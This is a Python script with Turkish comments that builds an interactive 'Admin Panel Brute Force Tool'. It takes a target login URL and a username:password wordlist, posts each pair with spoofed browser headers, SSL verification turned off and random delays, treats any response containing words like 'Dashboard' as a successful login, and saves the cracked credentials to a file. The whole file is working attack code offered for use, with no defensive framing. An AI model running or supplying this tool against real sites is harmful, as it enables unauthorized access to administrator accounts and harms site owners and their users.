import requests
import time
import random
from datetime import datetime
import logging
import sys
import os
from colorama import init, Fore, Back, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Renkli çıktı için colorama başlatma
init(autoreset=True)

# SSL uyarılarını devre dışı bırak
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class BruteForcer:
    def __init__(self):
        self.url = None
        self.giris_dosyasi = "giris.txt"
        self.log_dosyasi = "bruteforce_log.txt"
        self.basarili_dosya = "basarili_girisler.txt"
        self.timeout = 10
        self.min_delay = 1.5
        self.max_delay = 3.0
        self.max_deneme = 3
        
        self.basari_kriterleri = [
            "Dashboard", "Admin Panel", "Welcome", "Control Panel", "Yönetim Paneli",
            "admin", "dashboard", "panel", "control", "yönetim"
        ]
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.setup_logging()

    def clear_screen(self):
        """Ekranı temizle"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        """Kali Linux benzeri banner yazdır"""
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║  {Fore.GREEN}    _   __                _    __           __             {Fore.RED}║
║  {Fore.GREEN}   / | / /__  _  ____  __| |  / /___  ____/ /____  _  __ {Fore.RED}║
║  {Fore.GREEN}  /  |/ / _ \| |/_/ _ \/ _  | / / __ \/ __  / __ \| |/_/ {Fore.RED}║
║  {Fore.GREEN} / /|  /  __/>  </  __/ |_| |/ / /_/ / /_/ / /_/ />  <   {Fore.RED}║
║  {Fore.GREEN}/_/ |_/\___/_/|_|\___/\__,_/_/\____/\__,_/\____/_/|_|    {Fore.RED}║
║                                                                  ║
║  {Fore.CYAN}Admin Panel Brute Force Tool v2.0                          {Fore.RED}║
║  {Fore.CYAN}Developed by NoerDev                                       {Fore.RED}║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def print_menu(self):
        """Ana menüyü göster"""
        print(f"\n{Fore.YELLOW}[*] Mevcut Seçenekler:")
        print(f"{Fore.CYAN}[1] URL Belirle")
        print(f"{Fore.CYAN}[2] Wordlist Belirle")
        print(f"{Fore.CYAN}[3] Saldırıyı Başlat")
        print(f"{Fore.CYAN}[4] Ayarları Göster")
        print(f"{Fore.RED}[5] Çıkış\n")

    def setup_logging(self):
        """Loglama ayarlarını yapılandır"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.log_dosyasi, encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )

    def save_successful_login(self, username, password):
        """Başarılı girişleri kaydet"""
        with open(self.basarili_dosya, 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now()} - Kullanıcı: {username} - Şifre: {password}\n")
        print(f"\n{Fore.GREEN}[+] Başarılı giriş kaydedildi: {self.basarili_dosya}")

    def check_login_success(self, response_text):
        """Yanıtta başarılı giriş kriterlerini kontrol et"""
        return any(kriter.lower() in response_text.lower() for kriter in self.basari_kriterleri)

    def try_login(self, username, password):
        """Tek bir giriş denemesi gerçekleştir"""
        data = {
            'username': username,
            'password': password,
            'submit': 'Giriş'
        }

        for deneme in range(self.max_deneme):
            try:
                print(f"\r{Fore.YELLOW}[*] Deneniyor: {username}:{password} ({deneme + 1}/{self.max_deneme})", end='')
                
                response = self.session.post(
                    self.url,
                    data=data,
                    timeout=self.timeout,
                    verify=False
                )

                if response.status_code == 200:
                    if self.check_login_success(response.text):
                        print(f"\n{Fore.GREEN}[+] BAŞARILI! Kullanıcı: {username} - Şifre: {password}")
                        self.save_successful_login(username, password)
                        return True
                    else:
                        print(f"\r{Fore.RED}[-] Başarısız: {username}:{password}" + " " * 20)
                else:
                    print(f"\n{Fore.YELLOW}[!] HTTP {response.status_code} - Kullanıcı: {username}")

            except requests.RequestException as e:
                print(f"\n{Fore.RED}[!] HATA: {str(e)}")
                if deneme < self.max_deneme - 1:
                    time.sleep(random.uniform(self.min_delay * 2, self.max_delay * 2))
                continue

            time.sleep(random.uniform(self.min_delay, self.max_delay))
        return False

    def set_url(self):
        """Hedef URL'yi ayarla"""
        self.clear_screen()
        self.print_banner()
        print(f"\n{Fore.YELLOW}[*] Mevcut URL: {self.url if self.url else 'Belirtilmedi'}")
        new_url = input(f"\n{Fore.CYAN}[?] Hedef URL'yi girin: ")
        if new_url:
            self.url = new_url
            print(f"\n{Fore.GREEN}[+] URL güncellendi: {self.url}")
        input(f"\n{Fore.YELLOW}[*] Devam etmek için ENTER'a basın...")

    def set_wordlist(self):
        """Wordlist dosyasını ayarla"""
        self.clear_screen()
        self.print_banner()
        print(f"\n{Fore.YELLOW}[*] Mevcut wordlist: {self.giris_dosyasi}")
        new_file = input(f"\n{Fore.CYAN}[?] Yeni wordlist dosyasını girin: ")
        if new_file and os.path.exists(new_file):
            self.giris_dosyasi = new_file
            print(f"\n{Fore.GREEN}[+] Wordlist güncellendi: {self.giris_dosyasi}")
        else:
            print(f"\n{Fore.RED}[-] Dosya bulunamadı!")
        input(f"\n{Fore.YELLOW}[*] Devam etmek için ENTER'a basın...")

    def show_settings(self):
        """Mevcut ayarları göster"""
        self.clear_screen()
        self.print_banner()
        print(f"\n{Fore.YELLOW}[*] Mevcut Ayarlar:")
        print(f"{Fore.CYAN}    URL: {self.url if self.url else 'Belirtilmedi'}")
        print(f"{Fore.CYAN}    Wordlist: {self.giris_dosyasi}")
        print(f"{Fore.CYAN}    Timeout: {self.timeout} saniye")
        print(f"{Fore.CYAN}    Min Delay: {self.min_delay} saniye")
        print(f"{Fore.CYAN}    Max Delay: {self.max_delay} saniye")
        print(f"{Fore.CYAN}    Max Deneme: {self.max_deneme}")
        input(f"\n{Fore.YELLOW}[*] Devam etmek için ENTER'a basın...")

    def run(self):
        """Ana program döngüsü"""
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = input(f"{Fore.GREEN}[?] Seçiminiz (1-5): ")
            
            if choice == '1':
                self.set_url()
            elif choice == '2':
                self.set_wordlist()
            elif choice == '3':
                if not self.url:
                    print(f"\n{Fore.RED}[-] Önce URL belirlemelisiniz!")
                    input(f"\n{Fore.YELLOW}[*] Devam etmek için ENTER'a basın...")
                    continue
                    
                self.start_attack()
            elif choice == '4':
                self.show_settings()
            elif choice == '5':
                print(f"\n{Fore.YELLOW}[*] Program sonlandırılıyor...")
                break
            else:
                print(f"\n{Fore.RED}[-] Geçersiz seçim!")
                input(f"\n{Fore.YELLOW}[*] Devam etmek için ENTER'a basın...")

    def start_attack(self):
        """Brute force saldırısını başlat"""
        self.clear_screen()
        self.print_banner()
        print(f"\n{Fore.YELLOW}[*] Brute force saldırısı başlatılıyor...")
        
        try:
            with open(self.giris_dosyasi, 'r', encoding='utf-8') as f:
                toplam_satir = sum(1 for _ in f)
            
            print(f"{Fore.CYAN}[*] Toplam {toplam_satir} kombinasyon test edilecek\n")
            
            with open(self.giris_dosyasi, 'r', encoding='utf-8') as f:
                for index, line in enumerate(f, 1):
                    if ':' not in line:
                        print(f"{Fore.RED}[-] Geçersiz format, satır {index}: {line.strip()}")
                        continue

                    username, password = line.strip().split(':', 1)
                    if self.try_login(username, password):
                        break

        except FileNotFoundError:
            print(f"\n{Fore.RED}[-] Wordlist dosyası bulunamadı: {self.giris_dosyasi}")
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Program kullanıcı tarafından durduruldu.")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Beklenmeyen hata: {str(e)}")
        
        input(f"\n{Fore.YELLOW}[*] Ana menüye dönmek için ENTER'a basın...")

def main():
    try:
        brute_forcer = BruteForcer()
        brute_forcer.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program sonlandırıldı.")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Kritik hata: {str(e)}")

if __name__ == "__main__":
    main()
